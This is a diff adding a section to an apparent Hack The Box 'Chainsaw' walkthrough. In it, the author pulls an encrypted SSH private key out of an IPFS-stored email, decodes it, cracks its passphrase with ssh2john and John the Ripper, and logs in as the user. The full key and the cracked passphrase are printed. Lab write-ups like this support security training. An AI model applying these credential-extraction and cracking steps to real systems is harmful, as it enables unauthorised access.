@@ -672,6 +672,216 @@ This was interesting to me, so I continued my exploration. I found another direc
 
 <img src="/assets/img/writeups/HTB-CHAINSAW/IPFS.PNG" class="chainsaw-img" alt="Google - Interplanetary File System">
 
+After reading some further cli documentation on `IPFS` (located <a href="https://docs.ipfs.io/reference/api/cli/">`here`</a>), I found I could use the `ipfs refs local` command to list existing local references:
+
+```python
+administrator@chainsaw:~/.ipfs$ ipfs refs local
+QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y
+QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx
+QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB
+QmdL9t1YP99v4a2wyXFYAQJtbD9zKnPrugFLQWXBXb82sn
+QmSKboVigcD3AY4kLsob117KJcMHvMUu6vNFqk1PQzYUpp
+QmUHHbX4N8tUNyXFK9jNfgpFFddGgpn72CF1JyNnZNeVVn
+QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1
+QmWSLAHhiNVRMFMv4bnE7fqq9E74RtXTRm9E1QVo37GV9t
+QmPjsarLFBcY8seiv3rpUZ2aTyauPF3Xu3kQm56iD6mdcq
+QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri
+[...]
+QmSyJKw6U6NaXupYqMLbEbpCdsaYR5qiNGRHjLKcmZV17r
+QmZZRTyhDpL5Jgift1cHbAhexeE1m2Hw8x8g7rTcPahDvo
+QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS
+QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M
+QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB
+Qmc7rLAhEh17UpguAsEyS4yfmAbeqSeSEz4mZZRNcW52vV
+```
+
+I began running `ipfs ls <hash>` in an attempt to obtain some more information. Through quite a few phases of trial and error, I landed on this particular hash:
+`QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri`
+<p><br></p>
+
+Which returned multiple `.eml` files:
+
+```python
+administrator@chainsaw:~/.ipfs$ ipfs ls QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri
+QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB 10063 artichain600-protonmail-2018-12-13T20_50_58+01_00.eml
+QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 4640  bobbyaxelrod600-protonmail-2018-12-13-T20_28_54+01_00.eml
+QmZxzK6gXioAUH9a68ojwkos8EaeANnicBJNA3TND4Sizp 10084 bryanconnerty600-protonmail-2018-12-13T20_50_36+01_00.eml
+QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1 10083 laraaxelrod600-protonmail-2018-12-13T20_49_35+01_00.eml
+QmXwXzVYKgYZEXU1dgCKeejT87Knw9nydGcuUZrjwNb2Me 10092 wendyrhoades600-protonmail-2018-12-13T20_50_15+01_00.eml
+```
+
+I was only interested in the one belonging to `bobby` (for obvious reasons), so I used `ipfs get <hash>` in order to grab the file:
+
+```python
+administrator@chainsaw:~/.ipfs$ ipfs get QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 
+Saving file(s) to QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF
+ 4.53 KiB / 4.53 KiB [=====================================================================] 100.00% 0s
+administrator@chainsaw:~/.ipfs$ ls -al
+total 44
+drwxrwxr-x  5 administrator administrator 4096 Dec 20 01:15 .
+drwxr-x--- 10 administrator administrator 4096 Dec 20 00:48 ..
+drwxr-xr-x 41 administrator administrator 4096 Dec 20 01:15 blocks
+-rw-rw----  1 administrator administrator 5273 Dec 13  2018 config
+drwxr-xr-x  2 administrator administrator 4096 Dec 20 01:15 datastore
+-rw-------  1 administrator administrator  190 Dec 13  2018 datastore_spec
+drwx------  2 administrator administrator 4096 Dec 13  2018 keystore
+-rw-rw-r--  1 administrator administrator 4629 Dec 20 01:15 QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF  <--- Here's the file now!
+-rw-r--r--  1 administrator administrator    2 Dec 13  2018 version
+```
+
+I went ahead and viewed the file afterwards:
+
+```python
+administrator@chainsaw:~/.ipfs$ cat QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 
+X-Pm-Origin: internal
+X-Pm-Content-Encryption: end-to-end
+Subject: Ubuntu Server Private RSA Key
+From: IT Department <chainsaw_admin@protonmail.ch>
+Date: Thu, 13 Dec 2018 19:28:54 +0000
+Mime-Version: 1.0
+Content-Type: multipart/mixed;boundary=---------------------d296272d7cb599bff2a1ddf6d6374d93
+To: bobbyaxelrod600@protonmail.ch <bobbyaxelrod600@protonmail.ch>
+X-Attached: bobby.key.enc
+Message-Id: <zctvLwVo5mWy8NaBt3CLKmxVckb-cX7OCfxUYfHsU2af1NH4krcpgGz7h-PorsytjrT3sA9Ju8WNuWaRAnbE0CY0nIk2WmuwOvOnmRhHPoU=@protonmail.ch>
+Received: from mail.protonmail.ch by mail.protonmail.ch; Thu, 13 Dec 2018 14:28:58 -0500
+X-Original-To: bobbyaxelrod600@protonmail.ch
+Return-Path: <chainsaw_admin@protonmail.ch>
+Delivered-To: bobbyaxelrod600@protonmail.ch
+
+-----------------------d296272d7cb599bff2a1ddf6d6374d93
+Content-Type: multipart/related;boundary=---------------------ffced83f318ffbd54e80374f045d2451
+
+-----------------------ffced83f318ffbd54e80374f045d2451
+Content-Type: text/html;charset=utf-8
+Content-Transfer-Encoding: base64
+
+PGRpdj5Cb2JieSw8YnI+PC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj5JIGFtIHdyaXRpbmcgdGhp
+cyBlbWFpbCBpbiByZWZlcmVuY2UgdG8gdGhlIG1ldGhvZCBvbiBob3cgd2UgYWNjZXNzIG91ciBM
+aW51eCBzZXJ2ZXIgZnJvbSBub3cgb24uIER1ZSB0byBzZWN1cml0eSByZWFzb25zLCB3ZSBoYXZl
+IGRpc2FibGVkIFNTSCBwYXNzd29yZCBhdXRoZW50aWNhdGlvbiBhbmQgaW5zdGVhZCB3ZSB3aWxs
+IHVzZSBwcml2YXRlL3B1YmxpYyBrZXkgcGFpcnMgdG8gc2VjdXJlbHkgYW5kIGNvbnZlbmllbnRs
+eSBhY2Nlc3MgdGhlIG1hY2hpbmUuPGJyPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+QXR0YWNo
+ZWQgeW91IHdpbGwgZmluZCB5b3VyIHBlcnNvbmFsIGVuY3J5cHRlZCBwcml2YXRlIGtleS4gUGxl
+YXNlIGFzayZuYnNwO3JlY2VwdGlvbiBkZXNrIGZvciB5b3VyIHBhc3N3b3JkLCB0aGVyZWZvcmUg
+YmUgc3VyZSB0byBicmluZyB5b3VyIHZhbGlkIElEIGFzIGFsd2F5cy48YnI+PC9kaXY+PGRpdj48
+YnI+PC9kaXY+PGRpdj5TaW5jZXJlbHksPGJyPjwvZGl2PjxkaXY+SVQgQWRtaW5pc3RyYXRpb24g
+RGVwYXJ0bWVudDxicj48L2Rpdj4=
+-----------------------ffced83f318ffbd54e80374f045d2451--
+-----------------------d296272d7cb599bff2a1ddf6d6374d93
+Content-Type: application/octet-stream; filename="bobby.key.enc"; name="bobby.key.enc"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="bobby.key.enc"; name="bobby.key.enc"
+
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
+Sy1JbmZvOiBERVMtRURFMy1DQkMsNTNEODgxRjI5OUJBODUwMwoKU2VDTll3L0JzWFB5UXExSFJM
+RUVLaGlOSVZmdFphZ3pPY2M2NGZmMUlwSm85SWVHN1ovemordjFkQ0lkZWp1awo3a3RRRmN6VGx0
+dG5ySWo2bWRCYjZybk42Q3NQMHZiejlOelJCeWcxbzZjU0dkckwyRW1KTi9lU3hENEFXTGN6Cm4z
+MkZQWTBWamxJVnJoNHJqaFJlMndQTm9nQWNpQ0htWkdFQjB0Z3YyL2V5eEU2M1ZjUnpyeEpDWWwr
+aHZTWjYKZnZzU1g4QTRRcjdyYmY5Zm56NFBJbUlndXJGM1ZoUW1kbEVtekRSVDRtL3BxZjNUbUdB
+azkrd3JpcW5rT0RGUQpJKzJJMWNQYjhKUmhMU3ozcHlCM1gvdUdPVG5ZcDRhRXErQVFaMnZFSnoz
+RmZYOVNYOWs3ZGQ2S2FadFNBenFpCnc5ODFFUzg1RGs5TlVvOHVMeG5aQXczc0Y3UHo0RXVKMEhw
+bzFlWmdZdEt6dkRLcnJ3OHVvNFJDYWR4N0tIUlQKaW5LWGR1SHpuR0ExUVJPelpXN3hFM0hFTDN2
+eFI5Z01WOGdKUkhEWkRNSTl4bHc5OVFWd2N4UGNGYTMxQXpWMgp5cDNxN3lsOTU0U0NNT3RpNFJD
+M1o0eVVUakRrSGRIUW9FY0dpZUZPV1UraTFvaWo0Y3J4MUxiTzJMdDhuSEs2CkcxQ2NxN2lPb240
+UnNUUmxWcnY4bGlJR3J4bmhPWTI5NWU5ZHJsN0JYUHBKcmJ3c284eHhIbFQzMzMzWVU5ZGoKaFFM
+TnA1KzJINCtpNm1tVTN0Mm9nVG9QNHNrVmNvcURsQ0MrajZoRE9sNGJwRDl0NlRJSnVyV3htcEdn
+TnhlcwpxOE5zQWVudGJzRCt4bDRXNnE1bXVMSlFtai94UXJySGFjRVpER0k4a1d2WkUxaUZtVmtE
+L3hCUm53b0daNWh0CkR5aWxMUHBsOVIrRGg3YnkzbFBtOGtmOHRRbkhzcXBSSGNleUJGRnBucTBB
+VWRFS2ttMUxSTUxBUFlJTGJsS0cKandyQ3FSdkJLUk1JbDZ0SmlEODdOTTZKQm9ReWRPRWNwbis2
+RFUrMkFjdGVqYnVyMGFNNzRJeWVlbnJHS1NTWgpJWk1zZDJrVFNHVXh5OW8veFBLRGtVdy9TRlV5
+U21td2lxaUZMNlBhRGd4V1F3SHh0eHZtSE1oTDZjaXROZEl3ClRjT1RTSmN6bVIycEp4a29oTHJI
+N1lyUzJhbEtzTTBGcEZ3bWR6MS9YRFNGMkQ3aWJmL1cxbUF4TDVVbUVxTzAKaFVJdVcxZFJGd0hq
+TnZhb1NrK2ZyQXA2aWM2SVBZU21kbzhHWVl5OHBYdmNxd2ZScHhZbEFDWnU0RmlpNmhZaQo0V3Bo
+VDNaRllEcnc3U3RnSzA0a2JEN1FrUGVOcTlFdjFJbjJuVmR6RkhQSWg2eitmbXBiZ2ZXZ2VsTEhj
+MmV0ClNKWTQrNUNFYmtBY1lFVW5QV1k5U1BPSjdxZVU3K2IvZXF6aEtia3BuYmxtaUsxZjNyZU9N
+MllVS3k4YWFsZWgKbkpZbWttcjN0M3FHUnpoQUVUY2tjOEhMRTExZEdFK2w0YmE2V0JOdTE1R29F
+V0Fzenp0TXVJVjFlbW50OTdvTQpJbW5mb250T1lkd0I2LzJvQ3V5SlRpZjhWdy9XdFdxWk5icGV5
+OTcwNGE5bWFwLytiRHFlUVE0MStCOEFDRGJLCldvdnNneVdpL1VwaU1UNm02clgrRlA1RDVFOHpy
+WXRubm1xSW83dnhIcXRCV1V4amFoQ2RuQnJrWUZ6bDZLV1IKZ0Z6eDNlVGF0bFpXeXI0a3N2Rm10
+b2JZa1pWQVFQQUJXeitnSHB1S2xycWhDOUFOenIvSm4rNVpmRzAybW9GLwplZEwxYnA5SFBSSTQ3
+RHl2THd6VDEvNUw5Wno2WSsxTXplbmRUaTNLcnpRL1ljZnI1WUFSdll5TUxiTGpNRXRQClV2SmlZ
+NDB1Mm5tVmI2UXFwaXkyenIvYU1saHB1cFpQay94dDhvS2hLQytsOW1nT1RzQVhZakNiVG1MWHpW
+clgKMTVVMjEwQmR4RUZVRGNpeE5pd1Rwb0JTNk1meENPWndOLzFadjBtRThFQ0krNDRMY3FWdDN3
+PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=
+-----------------------d296272d7cb599bff2a1ddf6d6374d93--
+```
+
+It appears to be an email thread containing an ssh keypair for `bobby`. However, the private key is `bobby.key.enc` and not `bobby.key` as expected. Simply looking at it though, it appears to be encoded in `base64`. This is a bit of an issue, but nothing to fret over. I decided I would attempt to decode it locally first:
+
+```python
+➜  HTB-CHAINSAW cat bobby.key.enc.b64 |base64 -d
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,53D881F299BA8503
+
+SeCNYw/BsXPyQq1HRLEEKhiNIVftZagzOcc64ff1IpJo9IeG7Z/zj+v1dCIdejuk
+7ktQFczTlttnrIj6mdBb6rnN6CsP0vbz9NzRByg1o6cSGdrL2EmJN/eSxD4AWLcz
+n32FPY0VjlIVrh4rjhRe2wPNogAciCHmZGEB0tgv2/eyxE63VcRzrxJCYl+hvSZ6
+fvsSX8A4Qr7rbf9fnz4PImIgurF3VhQmdlEmzDRT4m/pqf3TmGAk9+wriqnkODFQ
+I+2I1cPb8JRhLSz3pyB3X/uGOTnYp4aEq+AQZ2vEJz3FfX9SX9k7dd6KaZtSAzqi
+w981ES85Dk9NUo8uLxnZAw3sF7Pz4EuJ0Hpo1eZgYtKzvDKrrw8uo4RCadx7KHRT
+inKXduHznGA1QROzZW7xE3HEL3vxR9gMV8gJRHDZDMI9xlw99QVwcxPcFa31AzV2
+yp3q7yl954SCMOti4RC3Z4yUTjDkHdHQoEcGieFOWU+i1oij4crx1LbO2Lt8nHK6
+G1Ccq7iOon4RsTRlVrv8liIGrxnhOY295e9drl7BXPpJrbwso8xxHlT3333YU9dj
+hQLNp5+2H4+i6mmU3t2ogToP4skVcoqDlCC+j6hDOl4bpD9t6TIJurWxmpGgNxes
+q8NsAentbsD+xl4W6q5muLJQmj/xQrrHacEZDGI8kWvZE1iFmVkD/xBRnwoGZ5ht
+DyilLPpl9R+Dh7by3lPm8kf8tQnHsqpRHceyBFFpnq0AUdEKkm1LRMLAPYILblKG
+jwrCqRvBKRMIl6tJiD87NM6JBoQydOEcpn+6DU+2Actejbur0aM74IyeenrGKSSZ
+IZMsd2kTSGUxy9o/xPKDkUw/SFUySmmwiqiFL6PaDgxWQwHxtxvmHMhL6citNdIw
+TcOTSJczmR2pJxkohLrH7YrS2alKsM0FpFwmdz1/XDSF2D7ibf/W1mAxL5UmEqO0
+hUIuW1dRFwHjNvaoSk+frAp6ic6IPYSmdo8GYYy8pXvcqwfRpxYlACZu4Fii6hYi
+4WphT3ZFYDrw7StgK04kbD7QkPeNq9Ev1In2nVdzFHPIh6z+fmpbgfWgelLHc2et
+SJY4+5CEbkAcYEUnPWY9SPOJ7qeU7+b/eqzhKbkpnblmiK1f3reOM2YUKy8aaleh
+nJYmkmr3t3qGRzhAETckc8HLE11dGE+l4ba6WBNu15GoEWAszztMuIV1emnt97oM
+ImnfontOYdwB6/2oCuyJTif8Vw/WtWqZNbpey9704a9map/+bDqeQQ41+B8ACDbK
+WovsgyWi/UpiMT6m6rX+FP5D5E8zrYtnnmqIo7vxHqtBWUxjahCdnBrkYFzl6KWR
+gFzx3eTatlZWyr4ksvFmtobYkZVAQPABWz+gHpuKlrqhC9ANzr/Jn+5ZfG02moF/
+edL1bp9HPRI47DyvLwzT1/5L9Zz6Y+1MzendTi3KrzQ/Ycfr5YARvYyMLbLjMEtP
+UvJiY40u2nmVb6Qqpiy2zr/aMlhpupZPk/xt8oKhKC+l9mgOTsAXYjCbTmLXzVrX
+15U210BdxEFUDcixNiwTpoBS6MfxCOZwN/1Zv0mE8ECI+44LcqVt3w==
+-----END RSA PRIVATE KEY-----
+```
+
+As expected, the private key was decoded with `base64` without any problems. However, it still appears to be encrypted, which is a bit of an issue. I decided I would combat this by utilizing `ssh2john` to obtain the hash of the key in a format recognizable by `john the ripper`, which I would then be able to crack accordingly with `rockyou.txt`.
+<p><br></p>
+
+I start with the hash conversion:
+
+```python
+➜  HTB-CHAINSAW /usr/share/john/ssh2john.py ./bobby.key.enc > bobby.key.enc.hash
+```
+
+Then ran `john` against the hash:
+
+```python
+➜  HTB-CHAINSAW john --wordlist=/usr/share/wordlists/rockyou.txt ./bobby.key.enc.hash
+```
+
+After only 12 seconds, I obtained the password `jackychain`:
+
+```python
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jackychain       (./bobby.key.enc)
+1g 0:00:00:12 DONE (2019-12-19 20:27) 0.08278g/s 1187Kp/s 1187Kc/s 1187KC/sa6_123..*7¡Vamos!
+Session completed
+```
+
+I was then able to SSH as `bobby` and `cat user.txt`!
+
+```python
+➜  HTB-CHAINSAW chmod 600 bobby.key.enc
+➜  HTB-CHAINSAW ssh -i bobby.key.enc bobby@chainsaw.htb
+Enter passphrase for key 'bobby.key.enc': jackychain
+bobby@chainsaw:~$ cat /home/bobby/user.txt
+af8d9df991cc[REDACTED...]
+```
 
 ### Writeup still in progress... Check back later for more!
 
